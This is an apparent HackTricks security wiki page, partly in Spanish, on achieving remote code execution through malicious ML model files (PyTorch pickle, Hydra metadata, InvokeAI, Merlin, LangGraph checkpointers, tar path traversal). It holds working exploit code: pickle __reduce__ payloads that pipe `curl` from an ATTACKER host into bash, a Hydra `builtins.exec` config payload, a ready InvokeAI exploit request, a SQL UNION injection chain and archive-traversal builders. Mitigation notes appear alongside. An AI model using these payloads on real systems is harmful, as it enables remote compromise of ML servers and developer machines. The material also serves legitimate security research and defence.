# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Los modelos de Machine Learning suelen compartirse en diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden cargarse en máquinas de desarrolladores o sistemas de producción para usarlos. Normalmente los modelos no deberían contener código malicioso, pero hay algunos casos en los que el modelo puede usarse para ejecutar código arbitrario en el sistema como funcionalidad prevista o debido a una vulnerabilidad en la librería de carga del modelo.

En el momento de la redacción, estos son algunos ejemplos de este tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Además, hay algunos modelos de python basados en pickle como los usados por [PyTorch](https://github.com/pytorch/pytorch/security) que pueden usarse para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Así que cualquier modelo basado en pickle puede ser especialmente susceptible a este tipo de ataques, incluso si no aparece en la tabla anterior.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Puntos clave:
- Se activa antes de la inicialización del modelo en `restore_from/from_pretrained` de NeMo, los coders de HuggingFace de uni2TS y los loaders de FlexTok.
- La block-list de strings de Hydra se puede eludir mediante rutas de importación alternativas (por ejemplo, `enum.bltns.eval`) o nombres resueltos por la aplicación (por ejemplo, `nemo.core.classes.common.os.system` → `posix`).
- FlexTok también analiza metadata convertida a string con `ast.literal_eval`, lo que permite DoS (aumento de CPU/memoria) antes de la llamada de Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` es una popular interfaz web de código abierto para Stable-Diffusion. Las versiones **5.3.1 – 5.4.2** exponen el endpoint REST `/api/v2/models/install` que permite a los usuarios descargar y cargar modelos desde URLs arbitrarias.

Internamente el endpoint finalmente llama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Cuando el archivo suministrado es un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza una **deserialización pickle**. Como el contenido proviene directamente de la URL controlada por el usuario, un atacante puede incrustar un objeto malicioso con un método `__reduce__` personalizado dentro del checkpoint; el método se ejecuta **durante la deserialización**, lo que lleva a **remote code execution (RCE)** en el servidor de InvokeAI.

La vulnerabilidad fue asignada **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Aloja `payload.ckpt` en un servidor HTTP que controles (p. ej. `http://ATTACKER/payload.ckpt`).
3. Dispara el endpoint vulnerable (no se requiere autenticación):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Cuando InvokeAI descarga el archivo, llama a `torch.load()` → el gadget `os.system` se ejecuta y el atacante obtiene ejecución de código en el contexto del proceso de InvokeAI.

Exploit listo para usar: módulo de **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo el flujo.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` reachable by the attacker
•  Process has permissions to execute shell commands

#### Mitigations

* Actualiza a **InvokeAI ≥ 5.4.3** – el patch establece `scan=True` por defecto y realiza análisis de malware antes de la deserialización.
* Al cargar checkpoints programáticamente, usa `torch.load(file, weights_only=True)` o el nuevo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Aplica allow-lists / signatures para las fuentes de modelos y ejecuta el servicio con el mínimo privilegio.

> ⚠️ Recuerda que **cualquier** formato basado en Python pickle (incluidos muchos archivos `.pt`, `.pkl`, `.ckpt`, `.pth`) es inherentemente inseguro de deserializar desde fuentes no confiables.

---

Ejemplo de una mitigación ad-hoc si tienes que mantener versiones antiguas de InvokeAI funcionando detrás de un reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (parte de Merlin) exponía un cargador de checkpoints inseguro que llamaba directamente a `torch.load()` sobre rutas proporcionadas por el usuario. Como `torch.load` depende de `Python` `pickle`, un checkpoint controlado por un atacante puede ejecutar código arbitrario mediante un reducer durante la deserialización.

Ruta vulnerable (antes del fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por qué esto lleva a RCE: En `Python` `pickle`, un objeto puede definir un reducer (`__reduce__`/`__setstate__`) que devuelve una callable y argumentos. La callable se ejecuta durante el unpickling. Si un objeto así está presente en un checkpoint, se ejecuta antes de que se usen los pesos.

Ejemplo mínimo de checkpoint malicioso:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vectors de entrega y blast radius:
- Checkpoints/models troyanizados compartidos vía repos, buckets o artifact registries
- Pipelines automatizados de resume/deploy que cargan checkpoints automáticamente
- La ejecución ocurre dentro de training/inference workers, a menudo con privilegios elevados (p. ej., root en containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) reemplazó el `torch.load()` directo con un deserializer restringido y allow-listed implementado en `transformers4rec/utils/serialization.py`. El nuevo loader valida types/fields y evita que se invoquen arbitrary callables durante load.

Defensive guidance específica para PyTorch checkpoints:
- No unpickle untrusted data. Prefiere formatos no ejecutables como [Safetensors](https://huggingface.co/docs/safetensors/index) u ONNX cuando sea posible.
- Si debes usar PyTorch serialization, asegúrate de usar `weights_only=True` (supported in newer PyTorch) o usa un custom allow-listed unpickler similar al patch de Transformers4Rec.
- Impón model provenance/signatures y sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS y sin network egress).
- Monitorea procesos hijo inesperados desde ML services en el momento de cargar checkpoints; traza uso de `torch.load()`/`pickle`.

POC y referencias vulnerable/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carga el modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD de Tencent expone un endpoint `resnet` que deserializa datos controlados por el usuario. ZDI confirmó que un atacante remoto puede coaccionar a una víctima para que cargue una página/archivo malicioso, hacer que envíe un blob serializado manipulado a ese endpoint y desencadenar la deserialización como `root`, lo que lleva a un compromiso total.

El flujo del exploit sigue el abuso típico de pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Cualquier gadget accesible durante la deserialización (constructores, `__setstate__`, callbacks del framework, etc.) puede ser armado de la misma forma, sin importar si el transporte fue HTTP, WebSocket o un archivo dejado en un directorio vigilado.



### LangGraph checkpointer SQLi → MessagePack RCE

Esta cadena de ataque es interesante porque el atacante **no necesita subir un archivo de modelo malicioso**. En su lugar, la aplicación expone una **AI-agent persistence API** (`get_state_history(..., filter=...)`) y la entrada del usuario llega al constructor de consultas del checkpointer.

#### 1. SQLi estructural en filtros de metadata

Un patrón vulnerable de SQLite se veía así:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
El valor se enlaza más tarde, pero `query_key` se concatena en la **cadena de ruta JSON**, así que un `'` dentro de la clave del diccionario sale de `'$.{query_key}'` e inyecta SQL. La misma lección aplica a **rutas JSON, identificadores, operadores, `LIMIT` y campos TTL**: los placeholders solo protegen valores, no la sintaxis estructural de la consulta.

#### 2. `UNION SELECT` puede apuntar a sinks downstream, no solo al robo de datos

La consulta devuelve `type` y bytes serializados de `checkpoint`, que luego se consumen como:
```python
self.serde.loads_typed((type, checkpoint))
```
Eso significa que una SQLi en la cláusula `WHERE` puede inyectar una **fila de resultado falsa**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Si posteriormente el código analiza, deserializa, escribe o ejecuta cualquier columna seleccionada, mapea esas columnas a sus sinks. En este caso, la fila falsa convierte SQLi en **deserialización controlada por el atacante**.

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

La ruta `msgpack` de LangGraph usaba un hook de extensión personalizado que desempaquetaba una tupla anidada y ejecutaba:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Así, un objeto de extensión MessagePack que codifica algo equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, resuelve `system` y ejecuta el comando. Al revisar frameworks de AI, inspecciona **custom MessagePack/JSON/pickle revivers** en busca de dynamic imports, reflection o arbitrary callable dispatch.

#### 4. Patrones prácticos de auditoría para agent frameworks

Revisa cualquier input controlado por el usuario que llegue a:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders que generen SQL o fragmentos de Redis query
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths que confíen en filas devueltas por la persistence layer

Esta cadena específica afectó despliegues self-hosted de LangGraph usando **SQLite** o **Redis** checkpointers cuando usuarios no confiables podían controlar `filter`. Las versiones corregidas indicadas en la divulgación fueron `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, y `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Como se comenta en [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la mayoría de los formatos de modelos usados por diferentes frameworks de AI se basan en archives, normalmente `.zip`. Por tanto, podría ser posible abusar de estos formatos para realizar ataques de path traversal, permitiendo leer archivos arbitrarios del sistema donde se carga el modelo.

Por ejemplo, con el siguiente código puedes crear un modelo que creará un archivo en el directorio `/tmp` cuando se cargue:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
O, con el siguiente código puedes crear un model que creará un symlink al directorio `/tmp` cuando se cargue:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Análisis profundo: deserialización de .keras de Keras y búsqueda de gadgets

Para una guía enfocada sobre los internals de .keras, Lambda-layer RCE, el problema de importación arbitraria en ≤ 3.8, y el descubrimiento de gadgets post-fix dentro del allowlist, consulta:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referencias

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
